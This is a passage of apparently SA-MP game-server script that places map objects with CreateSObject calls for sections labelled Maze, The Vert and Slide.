	CreateSObject(972, 864.475952, -3580.446777, 792.563538, 0.0000, 0.8594, 179.6226);
	CreateSObject(972, 824.610840, -3580.509521, 792.563538, 0.0000, 0.0000, 179.6226);
	CreateSObject(972, 824.768188, -3563.924316, 792.563538, 0.0000, 0.0000, 179.6226);
	CreateSObject(972, 864.480957, -3564.096924, 792.563538, 0.0000, 0.0000, 179.6226);
	CreateSObject(972, 818.493530, -3550.034668, 792.563538, 0.0000, 0.0000, 269.0040);
	CreateSObject(972, 859.118958, -3550.344482, 792.563538, 0.0000, 0.0000, 269.0040);
	CreateSObject(18450, 838.173279, -3305.127441, 497.905212, 0.0000, 299.8395, 270.6186);
	CreateSObject(6391, 826.031921, -2844.841309, 40.330433, 0.0000, 0.8594, 5.1566);
	CreateSObject(6391, 826.584351, -2844.957520, 80.922462, 0.0000, 0.8594, 5.1566);
	CreateSObject(18450, 836.291443, -3126.277588, 186.039276, 0.0000, 299.8395, 270.6186);
	CreateSObject(18450, 834.909363, -2997.617676, -10.990590, 0.0000, 317.8877, 270.6186);
	CreateSObject(18450, 834.833618, -2988.154297, -11.509488, 0.0000, 326.4820, 270.6186);
	CreateSObject(18450, 834.747009, -2979.118164, -8.948391, 0.0000, 336.7953, 270.6186);
	CreateSObject(18450, 834.611572, -2970.241943, -6.243568, 0.0000, 345.3896, 270.6186);
	CreateSObject(18450, 834.536438, -2963.037842, -1.914195, 0.0000, 353.9839, 270.6186);
	CreateSObject(8417, 807.901123, -2821.416504, 1.713478, 0.0000, 0.0000, 90.2408);
	CreateSObject(8417, 847.624817, -2821.641846, 1.713475, 0.0000, 0.0000, 90.2408);
	CreateSObject(1655, 834.080139, -2956.686768, 2.985570, 5.1566, 0.0000, 0.0000);
	CreateSObject(1655, 834.086426, -2952.365967, 6.226304, 20.6265, 0.0000, 0.0000);
	CreateSObject(1655, 834.047974, -2949.220215, 9.979132, 34.3775, 0.0000, 0.0000);
	CreateSObject(1655, 834.054993, -2947.400635, 13.547171, 49.8473, 0.0000, 0.0000);
	// 0.1.8C - Maze (Yosi):
	CreateSObject(8664, -37.250565, -3429.434326, 33.782436, 0.0000, 0.0000, 0.0000);
	CreateSObject(8664, -37.222054, -3290.116455, 33.781597, 0.0000, 0.0000, 0.0000);
	CreateSObject(972, -66.222664, -3230.475830, 33.856606, 0.0000, 0.0000, 91.1002);
	CreateSObject(972, -68.299080, -3230.460938, 33.856606, 0.0000, 0.0000, 177.9035);
	CreateSObject(972, -59.114491, -3230.337158, 33.856606, 0.0000, 0.0000, 179.6224);
	CreateSObject(972, -68.889626, -3254.896240, 33.856606, 0.0000, 0.0000, 179.6224);
	CreateSObject(972, -69.075661, -3279.585693, 33.856606, 0.0000, 0.0000, 179.6224);
	CreateSObject(972, -59.266167, -3255.347168, 33.856606, 0.0000, 0.0000, 179.6224);
	CreateSObject(972, -52.322823, -3275.962402, 33.856606, 0.0000, 0.0000, 269.0036);
	CreateSObject(972, -52.284538, -3266.854492, 33.856606, 0.0000, 0.0000, 269.0036);
	CreateSObject(972, -40.823380, -3260.037598, 33.856606, 0.0000, 0.0000, 359.2439);
	CreateSObject(972, -68.885315, -3256.489502, 33.974640, 0.0000, 0.0000, 179.6224);
	CreateSObject(972, -28.118004, -3276.808350, 33.804100, 0.0000, 356.5623, 269.0036);
	CreateSObject(972, -31.456192, -3260.400635, 33.856606, 0.0000, 0.0000, 359.2439);
	CreateSObject(972, -47.700226, -3248.976318, 33.856606, 0.0000, 0.8594, 88.5479);
	CreateSObject(972, -48.129391, -3239.623291, 33.856606, 0.0000, 0.8594, 89.4074);
	CreateSObject(972, -27.863976, -3232.803467, 33.856606, 0.0000, 0.0000, 271.5821);
	CreateSObject(972, -19.235683, -3243.270508, 33.856606, 0.0000, 0.0000, 271.5821);
	CreateSObject(972, -17.533852, -3267.248779, 33.856606, 0.0000, 358.2811, 269.0036);
	CreateSObject(972, -23.933723, -3276.773682, 33.897179, 0.0000, 358.2811, 269.0036);
	CreateSObject(972, -59.340607, -3289.112793, 33.856606, 0.0000, 0.0000, 179.6224);
	CreateSObject(972, 2.819628, -3255.603271, 33.856606, 0.0000, 0.0000, 181.3413);
	CreateSObject(972, -18.270905, -3232.643799, 33.856606, 0.0000, 0.0000, 271.5821);
	CreateSObject(972, -4.613173, -3232.265381, 33.836685, 0.0000, 0.0000, 271.5821);
	CreateSObject(972, 7.597721, -3260.398926, 33.856606, 0.0000, 0.0000, 2.6818);
	CreateSObject(972, 20.528141, -3242.283447, 33.856606, 0.0000, 0.0000, 271.5821);
	CreateSObject(972, 11.449793, -3231.869873, 33.856606, 0.0000, 0.0000, 271.5821);
	CreateSObject(972, 38.299904, -3230.892090, 33.856606, 0.0000, 0.0000, 180.4818);
	CreateSObject(972, 20.277983, -3222.020752, 33.856606, 0.0000, 0.0000, 271.5821);
	CreateSObject(972, 8.770645, -3222.160645, 33.729568, 359.1406, 0.0000, 271.5821);
	CreateSObject(972, 1.293157, -3220.603027, 33.856606, 0.0000, 0.0000, 183.9196);
	CreateSObject(972, 8.674833, -3284.723877, 33.856606, 0.0000, 0.0000, 2.6818);
	CreateSObject(972, -12.277492, -3293.704590, 33.856606, 0.0000, 0.0000, 2.6818);
	CreateSObject(972, -15.326973, -3243.065918, 33.939415, 359.1406, 0.0000, 271.5821);
	CreateSObject(972, -14.533665, -3267.550781, 33.848808, 0.0000, 358.2811, 269.0036);
	CreateSObject(972, -2.710938, -3294.627197, 33.856606, 0.0000, 0.0000, 2.6818);
	CreateSObject(8664, -37.499039, -3427.612061, 33.855762, 0.0000, 0.0000, 0.0000);
	CreateSObject(972, -52.362411, -3299.982910, 33.856606, 0.0000, 0.0000, 269.0036);
	CreateSObject(972, -82.743370, -3297.331299, 33.856606, 0.0000, 0.0000, 88.5216);
	CreateSObject(972, -82.779434, -3306.383545, 33.856606, 0.0000, 0.0000, 88.5216);
	CreateSObject(972, -93.843590, -3279.105469, 33.856606, 0.0000, 0.0000, 179.6224);
	CreateSObject(972, -86.661522, -3265.494141, 33.856606, 0.0000, 0.0000, 269.0036);
	CreateSObject(972, -87.131897, -3255.995850, 33.856606, 0.0000, 0.0000, 269.0036);
	CreateSObject(972, -94.312637, -3244.693604, 33.856606, 0.0000, 0.0000, 179.6224);
	CreateSObject(972, -97.730171, -3237.726807, 33.856606, 0.0000, 0.8594, 89.4074);
	CreateSObject(972, -108.787277, -3244.418457, 33.856606, 0.0000, 0.0000, 179.6224);
	CreateSObject(972, -101.876289, -3251.294922, 33.856606, 0.0000, 0.0000, 179.6224);
	CreateSObject(972, -119.689507, -3262.750244, 33.856606, 0.0000, 359.1406, 269.8631);
	CreateSObject(972, -108.728348, -3251.432861, 33.797813, 0.0000, 0.0000, 179.6224);
	CreateSObject(972, -101.800316, -3276.106689, 33.856606, 0.0000, 0.0000, 179.6224);
	CreateSObject(972, -101.563705, -3312.964355, 33.856606, 0.0000, 0.0000, 179.6224);
	CreateSObject(972, -97.922142, -3314.793457, 33.856598, 0.0000, 0.0000, 88.5216);
	CreateSObject(972, -102.153076, -3279.210449, 33.668190, 0.0000, 0.0000, 179.6224);
	CreateSObject(972, -108.897247, -3276.075439, 33.856606, 0.0000, 0.0000, 179.6224);
	CreateSObject(972, -108.815605, -3296.509277, 33.856606, 0.0000, 0.0000, 179.6224);
	CreateSObject(972, -73.972488, -3315.432861, 33.736641, 0.0000, 0.0000, 88.5216);
	CreateSObject(972, -61.782753, -3315.634277, 33.856606, 0.0000, 0.0000, 88.5216);
	CreateSObject(972, 8.867011, -3295.767822, 33.855598, 0.0000, 0.0000, 2.6818);
	CreateSObject(972, 22.924362, -3302.755371, 33.779243, 0.0000, 358.2811, 269.0036);
	CreateSObject(972, -23.065960, -3300.387207, 33.786415, 0.0000, 0.0000, 269.0036);
	CreateSObject(972, -43.036800, -3300.091797, 33.903442, 0.0000, 0.0000, 269.0036);
	CreateSObject(972, -48.157215, -3322.939941, 33.856606, 0.0000, 0.0000, 179.6224);
	CreateSObject(972, -39.458630, -3322.970215, 33.856606, 0.0000, 0.0000, 179.6224);
	CreateSObject(972, -62.026154, -3340.535400, 33.856606, 0.0000, 0.0000, 88.5216);
	CreateSObject(972, -73.392456, -3322.220703, 33.848816, 0.0000, 0.0000, 179.6224);
	CreateSObject(972, -82.058113, -3322.496094, 33.856606, 0.0000, 0.0000, 179.6224);
	CreateSObject(972, -72.922043, -3340.577637, 33.856606, 0.0000, 0.0000, 269.0038);
	CreateSObject(972, -86.610069, -3354.141113, 33.856606, 0.0000, 0.0000, 144.3855);
	CreateSObject(972, -88.757950, -3347.205811, 33.806602, 0.0000, 0.0000, 144.3855);
	CreateSObject(972, -102.542076, -3346.452148, 33.856606, 0.0000, 0.0000, 356.5619);
	CreateSObject(972, -108.050522, -3366.966797, 33.930771, 0.0000, 0.0000, 88.5216);
	CreateSObject(972, -109.244987, -3341.681152, 33.856606, 0.0000, 0.0000, 356.5619);
	CreateSObject(972, -109.866692, -3353.378662, 33.856606, 0.0000, 0.0000, 356.5619);
	CreateSObject(972, -102.164360, -3338.090576, 34.086433, 0.0000, 0.0000, 355.7025);
	CreateSObject(972, -57.149681, -3340.899902, 33.936501, 0.0000, 0.0000, 269.0038);
	CreateSObject(972, -39.440807, -3330.237061, 33.680161, 0.0000, 0.0000, 179.6224);
	CreateSObject(972, -32.324368, -3309.267578, 33.856606, 0.0000, 0.0000, 269.0036);
	CreateSObject(972, -12.775948, -3300.486816, 33.641205, 0.0000, 0.0000, 269.0036);
	CreateSObject(972, 23.051954, -3313.159912, 33.856606, 0.0000, 358.2811, 269.0036);
	CreateSObject(972, -2.168089, -3306.456299, 33.886673, 0.0000, 0.0000, 2.6818);
	CreateSObject(972, -22.896538, -3309.330566, 33.856606, 0.0000, 0.0000, 269.0036);
	CreateSObject(972, -6.808178, -3328.525635, 33.817886, 0.0000, 0.0000, 338.6176);
	CreateSObject(972, 3.118031, -3330.864014, 33.848808, 0.0000, 359.1406, 18.1517);
	CreateSObject(972, 14.125383, -3331.109863, 33.848808, 0.0000, 359.1406, 18.1517);
	CreateSObject(972, -17.023390, -3325.580566, 33.856606, 0.0000, 356.5623, 338.6176);
	CreateSObject(972, -32.251606, -3332.560547, 33.856606, 0.0000, 0.0000, 269.0036);
	CreateSObject(972, -44.952267, -3341.283936, 33.856606, 0.0000, 0.0000, 269.0038);
	CreateSObject(972, -26.976479, -3355.020264, 33.856606, 0.0000, 0.0000, 181.3413);
	CreateSObject(972, -14.306339, -3345.301758, 33.856606, 0.0000, 0.0000, 180.4818);
	CreateSObject(972, -15.826881, -3374.785400, 33.930771, 0.0000, 359.1406, 18.1517);
	CreateSObject(972, -4.350291, -3349.065186, 33.856606, 0.0000, 0.0000, 180.4818);
	CreateSObject(972, -6.438279, -3377.150879, 33.930771, 0.0000, 359.1406, 18.1517);
	CreateSObject(972, 12.791031, -3349.675293, 33.856606, 0.0000, 0.0000, 180.4818);
	CreateSObject(972, 1.092984, -3376.295166, 33.930771, 0.0000, 356.5623, 338.6176);
	CreateSObject(972, -44.295547, -3366.113281, 33.930771, 0.0000, 0.0000, 269.0038);
	CreateSObject(972, -51.617447, -3354.772461, 33.930771, 0.0000, 0.0000, 181.3413);
	CreateSObject(972, -24.022459, -3379.873535, 33.930771, 0.0000, 0.0000, 269.0038);
	CreateSObject(972, -15.298206, -3386.357422, 33.930771, 0.0000, 0.0000, 283.6141);
	CreateSObject(972, -47.502975, -3377.364014, 33.930771, 0.0000, 0.0000, 260.4095);
	CreateSObject(972, -38.099457, -3386.356445, 33.930771, 0.0000, 0.0000, 260.4095);
	CreateSObject(972, -45.165649, -3397.916992, 33.930771, 0.0000, 0.0000, 181.3413);
	CreateSObject(972, -52.494232, -3394.832031, 33.930771, 0.0000, 0.0000, 181.3413);
	CreateSObject(972, -69.955391, -3378.914795, 33.930771, 0.0000, 0.0000, 260.4095);
	CreateSObject(972, -69.990211, -3372.339355, 33.930771, 0.0000, 0.8594, 255.2529);
	CreateSObject(972, -87.137375, -3367.729492, 33.833008, 0.0000, 0.0000, 221.7348);
	CreateSObject(972, -86.412529, -3360.212646, 33.930771, 0.0000, 0.8594, 260.4095);
	CreateSObject(972, -68.248360, -3363.319336, 33.930771, 0.0000, 0.8594, 259.5501);
	CreateSObject(972, 23.824093, -3350.115479, 33.848816, 0.0000, 0.0000, 180.4818);
	CreateSObject(972, 12.687887, -3376.936279, 33.930771, 0.0000, 356.5623, 338.6176);
	CreateSObject(972, 34.333359, -3306.907959, 33.856606, 0.0000, 0.0000, 359.2441);
	CreateSObject(8664, -37.482094, -3567.413818, 33.847126, 0.0000, 0.0000, 0.0000);
	CreateSObject(972, 1.016624, -3397.936035, 33.917664, 0.0000, 356.5623, 325.7261);
	CreateSObject(972, -9.699629, -3396.051758, 33.930771, 0.0000, 356.5623, 325.7261);
	CreateSObject(972, -69.172005, -3403.604248, 33.930771, 0.0000, 0.0000, 260.4095);
	CreateSObject(972, -45.152317, -3405.931885, 33.952576, 0.0000, 0.0000, 181.3413);
	CreateSObject(972, -61.372467, -3414.525879, 33.930771, 0.0000, 0.0000, 260.4095);
	CreateSObject(972, -86.512619, -3392.380127, 33.930771, 0.0000, 0.0000, 221.7348);
	CreateSObject(972, -74.997360, -3412.111816, 33.930771, 0.0000, 0.0000, 260.4095);
	CreateSObject(972, -92.824913, -3401.155762, 33.930771, 0.0000, 359.1406, 221.7348);
	CreateSObject(972, -99.314163, -3381.528320, 33.930771, 0.0000, 0.0000, 181.3413);
	CreateSObject(972, -112.306732, -3399.022949, 33.930771, 0.0000, 0.0000, 88.5216);
	CreateSObject(972, -115.432358, -3378.671875, 33.930771, 0.0000, 0.0000, 356.5619);
	CreateSObject(972, -115.096626, -3384.543457, 34.919426, 0.0000, 0.0000, 359.9997);
	CreateSObject(972, -7.620152, -3410.713135, 33.922981, 0.0000, 356.5623, 325.7261);
	CreateSObject(972, -23.805918, -3416.602539, 33.883865, 0.0000, 356.5623, 325.7261);
	CreateSObject(972, -29.474775, -3440.644531, 33.930771, 0.0000, 356.5623, 325.7261);
	CreateSObject(972, -4.942787, -3430.184570, 33.930771, 0.0000, 0.0000, 193.3735);
	CreateSObject(972, -24.645939, -3412.605957, 33.930771, 0.0000, 0.0000, 181.3413);
	CreateSObject(972, -33.924881, -3410.934814, 33.930771, 0.0000, 0.0000, 181.3413);
	CreateSObject(972, -49.816105, -3417.797363, 33.922974, 0.0000, 0.0000, 254.3935);
	CreateSObject(972, -45.475197, -3430.046143, 33.605751, 0.0000, 0.0000, 254.3935);
	CreateSObject(972, -43.289860, -3446.524658, 33.930771, 0.0000, 1.7189, 325.7261);
	CreateSObject(972, -69.476707, -3423.480469, 33.584671, 0.0000, 0.0000, 254.3935);
	CreateSObject(972, -85.477722, -3419.272705, 33.615486, 0.0000, 0.0000, 254.3935);
	CreateSObject(972, -102.897820, -3407.161133, 33.930771, 0.0000, 359.1406, 221.7348);
	CreateSObject(972, -115.497139, -3391.629883, 33.930771, 0.0000, 0.0000, 359.9997);
	CreateSObject(972, -11.239426, -3438.890869, 33.930771, 0.0000, 0.0000, 203.6868);
	CreateSObject(972, -21.873022, -3448.836670, 33.930771, 0.0000, 0.0000, 262.1284);
	CreateSObject(972, 0.822277, -3453.992676, 33.930771, 0.0000, 0.0000, 193.3735);
	CreateSObject(972, -35.958103, -3456.864258, 33.930771, 0.0000, 0.0000, 254.3935);
	CreateSObject(972, -10.411364, -3478.327881, 33.930763, 0.0000, 0.0000, 323.1481);
	CreateSObject(972, -23.494667, -3459.912842, 34.042648, 0.0000, 0.0000, 254.3935);
	CreateSObject(972, -21.996801, -3476.786865, 33.930771, 0.0000, 0.0000, 323.1481);
	CreateSObject(972, -3.174557, -3488.002930, 33.930771, 0.0000, 0.0000, 254.3935);
	CreateSObject(972, -38.266220, -3479.650391, 33.930771, 0.0000, 0.0000, 254.3935);
	CreateSObject(972, 13.323917, -3484.685303, 33.930771, 0.0000, 0.0000, 323.1481);
	CreateSObject(972, 15.428869, -3463.339844, 33.930771, 0.0000, 0.0000, 231.1888);
	CreateSObject(972, 7.397422, -3457.129883, 33.930771, 0.0000, 0.0000, 231.1888);
	CreateSObject(972, -5.702260, -3494.838867, 33.922134, 0.0000, 0.0000, 254.3935);
	CreateSObject(972, 15.870979, -3493.280273, 33.922127, 0.0000, 0.0000, 323.1481);
	CreateSObject(972, -0.767406, -3496.220459, 33.922134, 0.0000, 0.0000, 254.3935);
	CreateSObject(972, 23.108080, -3483.471436, 33.802628, 0.0000, 0.0000, 323.1481);
	CreateSObject(972, 25.861145, -3461.911865, 33.930771, 0.0000, 0.0000, 228.6104);
	CreateSObject(972, 5.614571, -3447.026367, 33.922974, 0.0000, 0.0000, 237.2048);
	CreateSObject(972, -40.860115, -3486.432861, 33.930771, 0.0000, 0.0000, 255.2529);
	CreateSObject(972, -51.829121, -3464.864502, 33.930763, 0.0000, 4.2972, 204.5462);
	CreateSObject(8664, -37.212212, -3290.525635, 40.791611, 0.0000, 180.5856, 0.0000);
	CreateSObject(972, -59.033390, -3471.765381, 33.130722, 0.0000, 359.1406, 204.5462);
	CreateSObject(972, -45.814659, -3485.142090, 33.922974, 0.0000, 0.0000, 255.2529);
	CreateSObject(972, -66.037994, -3456.389404, 33.197929, 0.0000, 359.1406, 204.5462);
	CreateSObject(972, -63.189575, -3443.804688, 33.930771, 0.0000, 0.0000, 275.8792);
	CreateSObject(972, -73.312958, -3433.539063, 33.930771, 0.0000, 357.4217, 192.5140);
	CreateSObject(972, -39.162022, -3503.041260, 33.930771, 0.0000, 0.0000, 323.1481);
	CreateSObject(972, -27.729446, -3504.896240, 33.930771, 0.0000, 0.0000, 323.1481);
	CreateSObject(972, -53.549522, -3503.291748, 33.922134, 0.0000, 0.0000, 240.6426);
	CreateSObject(972, -20.507181, -3514.452637, 33.922134, 0.0000, 0.0000, 255.2529);
	CreateSObject(972, -66.620331, -3486.927490, 33.922134, 0.0000, 359.1406, 204.5462);
	CreateSObject(972, -56.297615, -3512.764160, 33.922134, 0.0000, 0.0000, 255.2529);
	CreateSObject(972, -23.410889, -3521.817871, 33.922134, 0.0000, 0.0000, 255.2529);
	CreateSObject(972, -70.527267, -3498.907227, 33.901947, 0.0000, 359.1406, 206.2645);
	CreateSObject(972, -89.331161, -3500.693359, 33.930771, 0.0000, 0.0000, 323.1480);
	CreateSObject(972, -96.004471, -3496.265381, 33.922134, 0.0000, 4.2972, 205.4055);
	CreateSObject(972, -87.005196, -3486.308838, 33.922974, 0.0000, 0.0000, 311.9755);
	CreateSObject(972, -93.940918, -3480.906738, 33.930771, 0.0000, 0.0000, 199.3894);
	CreateSObject(972, -104.777618, -3477.597900, 33.930771, 0.0000, 0.0000, 347.2122);
	CreateSObject(972, -37.219280, -3517.988525, 33.922134, 0.0000, 0.0000, 255.2529);
	CreateSObject(972, -0.066475, -3529.362061, 33.922134, 0.0000, 359.1406, 204.5462);
	CreateSObject(972, -2.991364, -3536.810303, 33.922134, 0.0000, 359.1406, 204.5462);
	CreateSObject(972, -11.248749, -3560.764160, 33.922134, 0.0000, 0.0000, 323.1481);
	CreateSObject(972, 5.876745, -3541.916992, 33.922134, 0.0000, 359.1406, 204.5462);
	CreateSObject(972, -2.424190, -3566.130371, 33.922134, 0.0000, 0.0000, 323.1481);
	CreateSObject(972, -20.219118, -3577.934082, 33.922134, 0.0000, 0.0000, 290.4894);
	CreateSObject(972, -28.806561, -3568.190674, 33.922134, 0.0000, 0.0000, 272.4413);
	CreateSObject(972, -38.984550, -3560.905273, 33.922142, 0.0000, 0.0000, 342.9151);
	CreateSObject(972, -40.982311, -3576.307617, 33.922134, 0.0000, 0.0000, 248.3771);
	CreateSObject(972, -54.507744, -3565.069824, 33.922134, 0.0000, 0.0000, 355.8064);
	CreateSObject(972, -44.545540, -3540.979492, 33.922134, 0.0000, 0.0000, 255.2529);
	CreateSObject(972, -63.550480, -3543.763428, 33.922134, 0.0000, 0.0000, 255.2529);
	CreateSObject(972, -66.607918, -3535.189941, 33.922134, 0.0000, 0.0000, 255.2529);
	CreateSObject(972, -88.759918, -3545.217773, 33.922134, 0.0000, 0.0000, 323.1480);
	CreateSObject(972, -75.676445, -3558.293213, 32.722061, 0.0000, 357.4217, 7.8385);
	CreateSObject(972, -91.446205, -3570.375977, 33.922134, 0.0000, 357.4217, 14.7140);
	CreateSObject(1698, -71.970200, -3571.584961, 42.068840, 91.1002, 29.2208, 187.3576);
	CreateSObject(1698, -72.829544, -3572.086426, 44.401810, 181.3415, 84.2246, 124.6187);
	CreateSObject(1698, -72.864143, -3572.191406, 42.283516, 181.3415, 87.6624, 124.6187);
	CreateSObject(1698, -72.757027, -3572.277344, 40.024559, 181.3415, 84.2246, 124.6187);
	CreateSObject(1698, -76.373367, -3573.904297, 40.954315, 91.1002, 35.2369, 182.2010);
	CreateSObject(1698, -76.381714, -3573.838867, 43.599922, 91.1002, 35.2369, 182.2010);
	CreateSObject(1698, -77.150993, -3575.166992, 40.692902, 294.6829, 1.7189, 306.8192);
	CreateSObject(1698, -78.093285, -3576.216309, 43.605896, 294.6829, 1.7189, 306.8192);
	CreateSObject(1698, -79.316856, -3576.868408, 43.879814, 91.1002, 35.2369, 182.2010);
	CreateSObject(1698, -79.293320, -3576.930908, 40.709045, 91.1002, 35.2369, 182.2010);
	CreateSObject(1698, -81.172958, -3578.473633, 43.729469, 91.1002, 35.2369, 163.2932);
	CreateSObject(1698, -81.192932, -3578.498779, 40.571281, 91.1002, 32.6586, 165.8716);
	CreateSObject(1698, -82.627609, -3579.097412, 44.793167, 343.6707, 4.2972, 118.7064);
	CreateSObject(1698, -82.783257, -3579.131104, 39.868027, 336.7952, 0.8594, 265.5666);
	CreateSObject(1698, -84.068512, -3579.530029, 42.850937, 268.8998, 6.8755, 306.8192);
	CreateSObject(1698, -84.076935, -3579.517578, 41.962967, 268.8998, 6.8755, 306.8192);
	CreateSObject(972, -103.274452, -3570.923340, 33.922134, 0.0000, 0.0000, 284.4735);
	CreateSObject(972, -115.811089, -3591.291016, 33.914337, 0.0000, 357.4217, 359.2441);
	CreateSObject(972, -115.668320, -3614.861328, 33.922134, 0.0000, 357.4217, 359.2441);
	CreateSObject(972, -101.595261, -3634.776855, 33.922134, 0.0000, 357.4217, 59.4047);
	CreateSObject(972, -81.271645, -3633.368896, 33.914337, 0.0000, 355.7028, 269.8630);
	CreateSObject(972, -45.481079, -3626.871094, 33.922134, 0.0000, 0.0000, 355.8064);
	CreateSObject(972, -43.768459, -3602.525391, 33.922134, 0.0000, 0.0000, 355.8064);
	CreateSObject(972, -43.454193, -3594.966064, 33.922134, 0.0000, 0.0000, 355.8064);
	CreateSObject(972, -57.079842, -3633.221191, 33.914337, 0.0000, 355.7028, 269.8630);
	CreateSObject(8664, -55.279613, -3430.829102, 41.577953, 0.0000, 179.7262, 0.0000);
	CreateSObject(8664, -49.963058, -3487.954834, 40.995541, 0.0000, 179.7262, 0.0000);
	// 0.1.8E - The Vert (FrighT):
	CreateSObject(8355, 534.868835, -3236.113037, 5.222523, 0.0000, 0.0000, 0.0000);
	CreateSObject(8355, 500.215057, -3236.137451, 5.249443, 0.0000, 0.0000, 0.0000);
	CreateSObject(8355, 549.453186, -3236.170166, 4.299445, 0.0000, 351.4056, 0.0000);
	CreateSObject(8355, 481.001923, -3237.637451, 5.101367, 0.0000, 6.8755, 0.0000);
	CreateSObject(8355, 559.352783, -3238.006104, 5.948682, 0.0000, 339.3735, 0.0000);
	CreateSObject(8355, 560.699463, -3237.536377, 6.775615, 0.0000, 333.3575, 0.0000);
	CreateSObject(8355, 558.788086, -3233.616211, 5.396571, 0.0000, 319.6065, 0.0000);
	CreateSObject(8355, 562.843445, -3238.589111, 8.736804, 0.0000, 314.4499, 0.0000);
	CreateSObject(8355, 567.354126, -3233.215332, 13.186885, 0.0000, 309.2933, 0.0000);
	CreateSObject(8355, 573.503784, -3237.327148, 20.554054, 0.0000, 304.1367, 0.0000);
	CreateSObject(8355, 576.741333, -3228.208252, 25.131218, 0.0000, 298.1206, 0.0000);
	CreateSObject(8355, 576.772766, -3232.576416, 25.077610, 0.0000, 293.8234, 0.0000);
	CreateSObject(8355, 582.214111, -3232.654541, 36.695637, 0.0000, 283.5102, 0.0000);
	CreateSObject(8355, 471.610046, -3238.027344, 5.412200, 0.0000, 15.4699, 0.0000);
	CreateSObject(8355, 461.483154, -3238.111572, 7.701147, 0.0000, 33.5180, 0.0000);
	CreateSObject(8355, 452.695038, -3239.122559, 10.849788, 0.0000, 55.0039, 0.0000);
	CreateSObject(8355, 446.920563, -3238.940186, 17.246002, 0.0000, 65.3171, 0.0000);
	CreateSObject(8355, 443.026886, -3239.106445, 25.189907, 0.0000, 68.7549, 0.0000);
	CreateSObject(8355, 439.232117, -3239.426025, 34.652512, 0.0000, 73.0521, 0.0000);
	CreateSObject(8355, 437.642578, -3239.557861, 39.520531, 0.0000, 79.0681, 0.0000);
	CreateSObject(8355, 435.956360, -3239.995605, 47.779018, 0.0000, 85.0842, 0.0000);
	CreateSObject(8355, 584.700378, -3232.597168, 45.992916, 0.0000, 276.6347, 0.0000);
	CreateSObject(8355, 567.219177, -3232.303223, 65.599495, 0.0000, 0.0000, 0.0000);
	CreateSObject(8355, 453.987640, -3240.039063, 67.575180, 0.0000, 0.0000, 0.0000);
	CreateSObject(8355, 511.384094, -3197.280518, 4.251363, 0.0000, 88.5220, 270.0000);
	CreateSObject(8355, 501.689636, -3196.254883, 44.151630, 0.0000, 88.5220, 270.0000);
	CreateSObject(8355, 588.456177, -3196.220947, 44.157082, 0.0000, 88.5220, 270.0000);
	CreateSObject(8355, 506.532837, -3298.012939, 4.251364, 0.0000, 88.5220, 90.0000);
	CreateSObject(8355, 516.987610, -3299.006348, 44.153332, 0.0000, 88.5220, 90.0000);
	CreateSObject(8355, 413.273895, -3299.041992, 44.139484, 0.0000, 88.5220, 90.0000);
	// 0.1.8E - Slide (FrighT):
	CreateSObject(5400, 1115.444458, -2622.508057, 23.231886, 0.0000, 0.0000, 90.0000);
	CreateSObject(5400, 1105.753906, -2622.469238, 23.247831, 0.0000, 0.0000, 90.0000);
	CreateSObject(5400, 1096.532593, -2622.440430, 22.891602, 6.8755, 0.0000, 90.0000);
	CreateSObject(5400, 1087.114990, -2622.423584, 23.810732, 11.1727, 0.0000, 90.0000);
	CreateSObject(5400, 1078.013794, -2622.419434, 25.268307, 17.1887, 0.0000, 90.0000);
	CreateSObject(5400, 1068.914917, -2622.408936, 28.085657, 17.1887, 0.0000, 90.0000);
	CreateSObject(5400, 1059.585571, -2622.404053, 30.977093, 17.1887, 0.0000, 90.0000);
	CreateSObject(5400, 1050.416870, -2622.392578, 33.809570, 17.1887, 0.0000, 90.0000);
	CreateSObject(5400, 1041.153198, -2622.359131, 36.673805, 17.1887, 0.0000, 90.0000);
	CreateSObject(5400, 1031.805542, -2622.367188, 39.574112, 17.1887, 0.0000, 90.0000);
	CreateSObject(5400, 1022.618652, -2622.332520, 42.290443, 19.7670, 0.0000, 90.0000);
	CreateSObject(5400, 1013.551392, -2622.308105, 45.402473, 22.3454, 0.0000, 90.0000);
	CreateSObject(5400, 1004.521912, -2622.353516, 49.111649, 22.3454, 0.0000, 90.0000);
	CreateSObject(5400, 995.677917, -2622.332764, 52.734695, 22.3454, 0.0000, 90.0000);
	CreateSObject(5400, 986.638611, -2622.346191, 56.440666, 22.3454, 0.0000, 90.0000);
	CreateSObject(5400, 977.758301, -2622.340820, 60.083160, 22.3454, 0.0000, 90.0000);
	CreateSObject(5400, 968.756042, -2622.328125, 63.783661, 22.3454, 0.0000, 90.0000);
	CreateSObject(5400, 959.758850, -2622.331543, 67.476929, 22.3454, 0.0000, 90.0000);
	CreateSObject(5400, 950.739319, -2622.306641, 71.177887, 22.3454, 0.0000, 90.0000);
	CreateSObject(5400, 941.711426, -2622.295898, 74.904335, 22.3454, 0.0000, 90.0000);
	CreateSObject(5400, 932.691650, -2622.262939, 78.625618, 22.3454, 0.0000, 90.0000);
	CreateSObject(5400, 923.947998, -2622.247559, 82.211754, 22.3454, 0.0000, 90.0000);
	CreateSObject(5400, 914.920593, -2622.254150, 85.933945, 22.3454, 0.0000, 90.0000);
	CreateSObject(5400, 905.887817, -2622.250000, 89.649307, 22.3454, 0.0000, 90.0000);
	CreateSObject(5400, 896.849792, -2622.260010, 93.350471, 22.3454, 0.0000, 90.0000);
	CreateSObject(5400, 887.803223, -2622.237061, 97.061798, 22.3454, 0.0000, 90.0000);
	CreateSObject(5400, 878.771423, -2622.229492, 100.769707, 22.3454, 0.0000, 90.0000);
	CreateSObject(5400, 869.768250, -2622.225098, 104.471169, 22.3454, 0.0000, 90.0000);
	CreateSObject(5400, 861.041565, -2622.227051, 107.874054, 25.7831, 0.0000, 90.0000);
	CreateSObject(5400, 852.516968, -2622.206055, 111.639977, 31.7992, 0.0000, 90.0000);
	CreateSObject(5400, 844.291870, -2622.199707, 116.635994, 33.5180, 0.0000, 90.0000);
	CreateSObject(5400, 836.141846, -2622.181885, 122.037811, 33.5180, 0.0000, 90.0000);
	CreateSObject(5400, 828.057861, -2622.177979, 127.404861, 33.5180, 0.0000, 90.0000);
	CreateSObject(5400, 819.921875, -2622.157471, 132.790756, 33.5180, 0.0000, 90.0000);
	CreateSObject(5400, 811.898560, -2622.147461, 138.093170, 33.5180, 0.0000, 90.0000);
	CreateSObject(5400, 1124.917603, -2622.489990, 23.982716, 356.5623, 0.0000, 90.0000);
	CreateSObject(5400, 1134.319946, -2622.478271, 25.292625, 353.1245, 0.0000, 90.0000);
	CreateSObject(5400, 1143.788208, -2622.504639, 26.815111, 351.4056, 0.0000, 90.0000);
